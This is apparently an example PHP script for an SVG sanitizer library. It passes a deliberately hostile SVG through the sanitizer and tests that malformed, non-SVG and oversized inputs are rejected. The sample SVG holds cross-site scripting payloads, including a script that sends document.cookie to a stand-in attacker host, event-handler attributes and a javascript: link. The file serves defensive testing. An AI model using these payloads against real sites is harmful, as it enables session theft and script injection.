<?php

/**
 * What the sanitizer removes and what it refuses. No extensions beyond
 * ext-dom/ext-libxml (hard requirements of the package), no server needed.
 */

declare(strict_types=1);

use Rasuvaeff\Yii3FilestorageImages\Exception\SvgSanitizationException;
use Rasuvaeff\Yii3FilestorageImages\Svg\EnshrinedSvgSanitizer;

require __DIR__ . '/../vendor/autoload.php';

$sanitizer = new EnshrinedSvgSanitizer();

$hostile = <<<'SVG'
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
        <use xlink:href="https://evil.example/defs.svg#payload"/>
        <foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)">hi</body></foreignObject>
        <rect width="10" height="10" onclick="alert(2)"/>
        <animate attributeName="href" to="javascript:alert(3)"/>
    </svg>
    SVG;

echo "--- sanitized ---\n" . $sanitizer->sanitize($hostile) . "\n\n";

// Input that cannot be made safe throws — there is no best-effort output.
foreach ([
    'not xml at all' => 'hello, world',
    'not an svg' => '<html xmlns="http://www.w3.org/1999/xhtml"><body>x</body></html>',
    'over the element cap' => '<svg xmlns="http://www.w3.org/2000/svg">'
        . str_repeat('<rect width="1" height="1"/>', 11_000) . '</svg>',
] as $label => $bad) {
    try {
        $sanitizer->sanitize($bad);
        echo "{$label}: UNEXPECTEDLY PASSED\n";
    } catch (SvgSanitizationException $exception) {
        echo "{$label}: rejected — {$exception->getMessage()}\n";
    }
}
